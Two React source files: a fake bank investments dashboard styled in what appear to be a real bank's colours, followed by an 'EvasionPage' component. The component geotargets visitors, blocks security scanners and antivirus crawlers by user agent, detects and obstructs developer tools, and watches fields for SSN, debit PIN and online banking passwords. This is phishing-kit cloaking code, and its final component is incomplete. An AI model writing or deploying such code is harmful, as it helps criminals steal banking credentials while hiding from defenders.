import DashboardLayout from "@/components/DashboardLayout";
import { formatCurrency } from "@/data/accountData";
import { TrendingUp, TrendingDown, PieChart } from "lucide-react";

const Investments = () => {
  const portfolio = {
    totalValue: 1250000,
    dayChange: 3250.45,
    dayChangePercent: 0.26,
    holdings: [
      { name: "S&P 500 Index Fund", symbol: "VOO", shares: 450, price: 523.40, change: 1.2, value: 235530 },
      { name: "Total Bond Market", symbol: "BND", shares: 800, price: 72.15, change: -0.3, value: 57720 },
      { name: "International Stocks", symbol: "VXUS", shares: 600, price: 58.92, change: 0.8, value: 35352 },
      { name: "Growth ETF", symbol: "VUG", shares: 300, price: 380.25, change: 1.5, value: 114075 },
      { name: "Real Estate Fund", symbol: "VNQ", shares: 200, price: 89.60, change: -0.1, value: 17920 },
      { name: "Money Market", symbol: "VMFXX", shares: 789403, price: 1.00, change: 0, value: 789403 },
    ],
  };

  return (
    <DashboardLayout>
      <div className="max-w-4xl mx-auto space-y-6">
        <h1 className="text-2xl font-semibold text-foreground">Investments</h1>

        {/* Portfolio summary */}
        <div className="bg-[#E31837] rounded-xl p-6 text-white shadow-lg">
          <p className="text-sm text-white/80 mb-1">Portfolio Value</p>
          <p className="text-3xl font-bold mb-2">{formatCurrency(portfolio.totalValue)}</p>
          <div className="flex items-center gap-2 text-sm">
            <TrendingUp className="h-4 w-4" />
            <span className="text-white/90">
              +{formatCurrency(portfolio.dayChange)} ({portfolio.dayChangePercent}%) today
            </span>
          </div>
        </div>

        {/* Allocation */}
        <div className="grid md:grid-cols-3 gap-4">
          {[
            { label: "Stocks", pct: "69%", color: "bg-[#012169]" },
            { label: "Bonds", pct: "5%", color: "bg-[#E31837]" },
            { label: "Cash & Equivalents", pct: "26%", color: "bg-success" },
          ].map(({ label, pct, color }) => (
            <div key={label} className="bg-card border border-border rounded-lg p-4 shadow-card flex items-center gap-3">
              <div className={`h-3 w-3 rounded-full ${color}`} />
              <div>
                <p className="text-sm font-medium text-foreground">{label}</p>
                <p className="text-lg font-semibold text-foreground">{pct}</p>
              </div>
            </div>
          ))}
        </div>

        {/* Holdings */}
        <div className="bg-card border border-border rounded-xl shadow-card">
          <div className="flex items-center gap-2 px-5 py-4 border-b border-border">
            <PieChart className="h-4 w-4 text-muted-foreground" />
            <h2 className="font-semibold text-foreground">Holdings</h2>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="text-left text-xs text-muted-foreground border-b border-border">
                  <th className="px-5 py-3 font-medium">Name</th>
                  <th className="px-5 py-3 font-medium">Symbol</th>
                  <th className="px-5 py-3 font-medium text-right">Shares</th>
                  <th className="px-5 py-3 font-medium text-right">Price</th>
                  <th className="px-5 py-3 font-medium text-right">Change</th>
                  <th className="px-5 py-3 font-medium text-right">Value</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border">
                {portfolio.holdings.map((h) => (
                  <tr key={h.symbol} className="hover:bg-muted/50 transition-colors">
                    <td className="px-5 py-3.5 font-medium text-foreground">{h.name}</td>
                    <td className="px-5 py-3.5 text-muted-foreground">{h.symbol}</td>
                    <td className="px-5 py-3.5 text-right text-foreground">{h.shares.toLocaleString()}</td>
                    <td className="px-5 py-3.5 text-right text-foreground">{formatCurrency(h.price)}</td>
                    <td className={`px-5 py-3.5 text-right font-medium flex items-center justify-end gap-1 ${
                      h.change > 0 ? "text-success" : h.change < 0 ? "text-destructive" : "text-muted-foreground"
                    }`}>
                      {h.change > 0 ? <TrendingUp className="h-3 w-3" /> : h.change < 0 ? <TrendingDown className="h-3 w-3" /> : null}
                      {h.change > 0 ? "+" : ""}{h.change}%
                    </td>
                    <td className="px-5 py-3.5 text-right font-semibold text-foreground">{formatCurrency(h.value)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </DashboardLayout>
  );
};

export default Investments;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }

}